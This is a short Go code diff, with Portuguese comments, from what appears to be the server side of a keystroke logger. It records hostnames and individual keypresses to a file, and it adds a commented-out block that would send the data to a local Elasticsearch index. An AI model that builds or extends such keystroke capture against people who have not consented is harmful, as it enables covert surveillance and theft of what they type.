@@ -144,7 +144,27 @@ func main() {
 				if _, err := f.WriteString(string(file) + "\n"); err != nil {
 					log.Println(err)
 				}
-				fmt.Printf("host %s tecla %s ", dados.Hostname, dados.Keypress)
+				fmt.Printf("host %s voce digitou %s \n", dados.Hostname, dados.Keypress)
+				///////////////////////////
+				/*	codigo para enviar pro elastic (dando erro na query de envio)
+					buf := new(bytes.Buffer)
+					json.NewEncoder(buf).Encode(dados)
+					req, _ := http.NewRequest("PUT", "http://localhost:9200/test", buf)
+					req.Header.Set("Content-Type", "application/json")
+					client := &http.Client{}
+					res, e := client.Do(req)
+					if e != nil {
+						log.Fatal(e)
+					}
+
+					defer res.Body.Close()
+
+					fmt.Println("response Status:", res.Status)
+
+					// Print the body to the stdout
+					io.Copy(os.Stdout, res.Body)
+				*/
+				/////////////////////////////
 				/*
 					//novo bloco
 					data, err := ioutil.ReadFile("/tmp/teclado-" + GetHostname() + ".json")
